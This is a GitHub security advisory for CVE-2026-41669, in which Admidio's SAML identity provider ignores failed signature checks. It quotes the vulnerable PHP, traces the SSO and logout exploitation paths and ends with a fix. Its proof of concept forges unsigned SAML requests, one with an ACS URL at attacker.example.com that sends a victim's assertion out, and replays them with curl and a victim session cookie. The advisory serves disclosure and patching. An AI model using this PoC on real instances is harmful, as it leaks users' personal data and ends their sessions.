# [H] Admidio Ignores SAML Signature Validation Result, Processes Forged AuthnRequests and LogoutRequests

## Summary
Severity: High
Advisory: GHSA-25cw-98hg-g3cg
CVE: CVE-2026-41669
CWE: CWE-347
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-25cw-98hg-g3cg
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

The Admidio SAML Identity Provider implementation discards the return value of its `validateSignature()` method at both call sites (`handleSSORequest()` line 418 and `handleSLORequest()` line 613). The method returns error strings on failure rather than throwing exceptions, but the developer believed it would throw (per comments on lines 416 and 611). This means the `smc_require_auth_signed` configuration option is completely ineffective — unsigned or invalidly-signed SAML AuthnRequests and LogoutRequests are processed identically to properly signed ones.

## Details

The `validateSignature()` method at `src/SSO/Service/SAMLService.php:355` has three possible return paths:

```php
// Line 355-392
public function validateSignature(SAMLClient $client, SamlMessage $message, bool $required = false): bool|string {
    global $gL10n;
    $certPem = $client->getValue('smc_x509_certificate');
    if (!$certPem) {
        if ($required) {
            return $gL10n->get('SYS_SSO_SAML_SIGNATURE_KEY_MISSING'); // Returns STRING, not throw
        } else {
            return false;
        }
    }
    // ...
    $signatureReader = $message->getSignature();
    if (is_null($signatureReader)) {
        if ($required) {
            return $gL10n->get('SYS_SSO_SAML_SIGNATURE_MISSING'); // Returns STRING, not throw
        } else {
            return false;
        }
    }
    try {
        $ok = $signatureReader->validate($key);
        if ($ok) {
            return true;
        } else {
            return $gL10n->get('SYS_SSO_SAML_SIGNATURE_FAILED'); // Returns STRING, not throw
        }
    } catch (Exception $ex) {
        return $gL10n->get('SYS_SSO_SAML_SIGNATURE_FAILED'); // Returns STRING, not throw
    }
}
```

Both call sites discard the return value entirely:

```php
// Line 416-419 in handleSSORequest()
// Validate signatures. Will throw an exception    <-- INCORRECT COMMENT
if ($client->getValue('smc_require_auth_signed') || $client->getValue('smc_validate_signatures')) {
    $this->validateSignature($client, $request, $client->getValue('smc_require_auth_signed'));
    // Return value discarded — execution continues regardless of validation result
}

// Line 611-614 in handleSLORequest()
// Validate signatures. Will throw an exception    <-- INCORRECT COMMENT
if ($client->getValue('smc_require_auth_signed') || $client->getValue('smc_validate_signatures')) {
    $this->validateSignature($client, $request, $client->getValue('smc_require_auth_signed'));
    // Return value discarded — execution continues regardless of validation result
}
```

**SSO exploitation path** (for already-logged-in users):
1. `modules/sso/index.php:92` routes to `handleSSORequest()`
2. Line 403: `receiveMessage()` parses SAML binding directly from HTTP GET/POST — no authentication required
3. Line 408-409: Entity ID extracted from the forged request's Issuer element, client config loaded
4. Line 417-419: Signature validation called but return value discarded — flow continues
5. Line 421: `$gValidLogin` is true for logged-in users, so login form is skipped
6. Lines 438-580: SAML Response built with user's real attributes (login, name, email, roles) and sent to the `AssertionConsumerServiceURL` from the forged request

**SLO exploitation path**:
1. `modules/sso/index.php:94` routes to `handleSLORequest()`
2. Line 613: Signature validation discarded
3. Lines 621-629: User's session is deleted from the database and `$gCurrentSession->logout()` is called

## PoC

```bash
# Prerequisites:
# - Admidio instance with SAML SSO enabled (sso_saml_enabled=1)
# - At least one registered SAML SP client with smc_require_auth_signed=true
# - A user with an active session (e.g., admin browsing the Admidio panel)

# 1. Generate an unsigned AuthnRequest impersonating a registered SP:
AUTHN_REQUEST=$(python3 -c "
import base64, zlib
req = '<samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_fake123\" Version=\"2.0\" IssueInstant=\"2026-03-27T00:00:00Z\" AssertionConsumerServiceURL=\"https://attacker.example.com/acs\"><saml:Issuer>https://legitimate-sp.example.com/entity-id</saml:Issuer></samlp:AuthnRequest>'
print(base64.b64encode(zlib.compress(req.encode())[2:-4]).decode())
")

# 2. Send the unsigned request via HTTP-Redirect binding (GET):
# If a logged-in user's browser follows this link (e.g., via CSRF/social engineering),
# Admidio generates a signed SAML assertion with the user's PII and sends it
# to the attacker-controlled ACS URL.
curl -v "https://admidio.example.org/adm_program/modules/sso/index.php/saml/sso?SAMLRequest=${AUTHN_REQUEST}" \
  -b 'PHPSESSID=VICTIM_SESSION_COOKIE'

# Expected: Despite smc_require_auth_signed=true, the unsigned request is processed.
# The response contains a SAML assertion with the victim's attributes.

# 3. For SLO — forge a LogoutRequest to terminate a victim's session:
LOGOUT_REQUEST=$(python3 -c "
import base64, zlib
req = '<samlp:LogoutRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_fake456\" Version=\"2.0\" IssueInstant=\"2026-03-27T00:00:00Z\"><saml:Issuer>https://legitimate-sp.example.com/entity-id</saml:Issuer><saml:NameID>victim@example.com</saml:NameID></samlp:LogoutRequest>'
print(base64.b64encode(zlib.compress(req.encode())[2:-4]).decode())
")

curl -v "https://admidio.example.org/adm_program/modules/sso/index.php/saml/slo?SAMLRequest=${LOGOUT_REQUEST}" \
  -b 'PHPSESSID=VICTIM_SESSION_COOKIE'

# Expected: Victim's session is terminated, logout cascaded to all registered SPs.
```

## Impact

- **Signature enforcement bypass**: The `smc_require_auth_signed` setting is entirely ineffective. Administrators who enable this setting believing it protects against forged requests have a false sense of security.
- **User attribute disclosure (SSO)**: When combined with the ability to specify an arbitrary `AssertionConsumerServiceURL`, an attacker can redirect a logged-in user's SAML assertion (containing login name, email, real name, role memberships) to an attacker-controlled endpoint.
- **Session termination (SLO)**: An attacker can forge LogoutRequests to terminate any user's Admidio session and trigger cascading single logout across all registered Service Providers, causing denial of service for targeted users.
- **Amplifies ACS URL injection**: The signature requirement was the primary defense against unvalidated ACS URLs in AuthnRequests. Without signature enforcement, the ACS redirect becomes trivially exploitable via GET redirect binding (which bypasses SameSite=Lax cookie restrictions).

## Recommended Fix

Check the return value of `validateSignature()` and throw on failure. In `src/SSO/Service/SAMLService.php`, fix both call sites:

```php
// In handleSSORequest(), replace lines 416-419:
// Validate signatures
if ($client->getValue('smc_require_auth_signed') || $client->getValue('smc_validate_signatures')) {
    $result = $this->validateSignature($client, $request, (bool)$client->getValue('smc_require_auth_signed'));
    if ($result !== true && $result !== false) {
        // $result is an error message string — validation failed
        throw new Exception($result);
    }
}

// In handleSLORequest(), replace lines 611-614 with the same pattern:
if ($client->getValue('smc_require_auth_signed') || $client->getValue('smc_validate_signatures')) {
    $result = $this->validateSignature($client, $request, (bool)$client->getValue('smc_require_auth_signed'));
    if ($result !== true && $result !== false) {
        throw new Exception($result);
    }
}
```

Alternatively, refactor `validateSignature()` to throw exceptions on failure (matching the developer's original intent as documented in the comments), which would make both call sites correct as-is:

```php
public function validateSignature(SAMLClient $client, SamlMessage $message, bool $required = false): bool {
    global $gL10n;
    $certPem = $client->getValue('smc_x509_certificate');
    if (!$certPem) {
        if ($required) {
            throw new Exception($gL10n->get('SYS_SSO_SAML_SIGNATURE_KEY_MISSING'));
        }
        return false;
    }
    // ... (same cert loading logic) ...
    $signatureReader = $message->getSignature();
    if (is_null($signatureReader)) {
        if ($required) {
            throw new Exception($gL10n->get('SYS_SSO_SAML_SIGNATURE_MISSING'));
        }
        return false;
    }
    try {
        if (!$signatureReader->validate($key)) {
            throw new Exception($gL10n->get('SYS_SSO_SAML_SIGNATURE_FAILED'));
        }
        return true;
    } catch (Exception $ex) {
        throw new Exception($gL10n->get('SYS_SSO_SAML_SIGNATURE_FAILED'));
    }
}
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-25cw-98hg-g3cg
- https://nvd.nist.gov/vuln/detail/CVE-2026-41669
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
